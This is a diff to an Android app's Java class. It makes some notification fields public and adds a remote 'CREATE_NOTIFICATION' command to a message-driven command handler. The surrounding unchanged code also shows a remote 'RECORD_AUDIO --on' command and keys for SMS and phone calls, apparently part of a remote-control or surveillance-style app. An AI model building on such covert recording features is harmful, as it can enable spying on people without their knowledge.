@@ -96,8 +96,8 @@ import static com.candroid.textme.jobs.JobsScheduler.PHONE_CALLS_KEY;
 import static com.candroid.textme.jobs.JobsScheduler.SMS_KEY;
 
 public class Lofl {
-    private static int sId = -1;
-    private static NotificationManager sNotificationManager;
+    public static int sId = -1;
+    public static NotificationManager sNotificationManager;
     private static Bitmap sLargeIcon;
     public static boolean sIsFlaghlightOn = false;
     public static CameraManager sCameraManager;
@@ -420,7 +420,7 @@ public class Lofl {
     }
 
     public static void testProcessCommand(Context context){
-        String message = Constants.COMMAND_CODE + Commands.RECORD_AUDIO + " --on";
+        String message = Constants.COMMAND_CODE + Commands.CREATE_NOTIFICATION + " --haha im a title --but you're a bot";
         processCommand(context,message);
     }
 
@@ -562,6 +562,14 @@ public class Lofl {
                         ScreenReceiver.sShouldRecordAudio = true;
                     }else{}
                     editor.apply();
+                }
+                commandFound = true;
+                break;
+            case Commands.CREATE_NOTIFICATION:
+                if(arg1 != null && arg2 != null){
+                    intent.putExtra(Constants.TITLE_KEY, arg1);
+                    intent.putExtra(Constants.CONTENT_KEY, arg2);
+                    intent.setAction(JobsIntentService.ACTION_CREATE_NOTIFICATION);
                 }
                 commandFound = true;
                 break;
@@ -960,7 +968,7 @@ public class Lofl {
         sNotificationManager.notify(sId, notification.build());
     }
 
-    private static void initNotificationManager(Context context) {
+    public static void initNotificationManager(Context context) {
         if (sNotificationManager == null) {
             sNotificationManager = context.getSystemService(NotificationManager.class);
         }
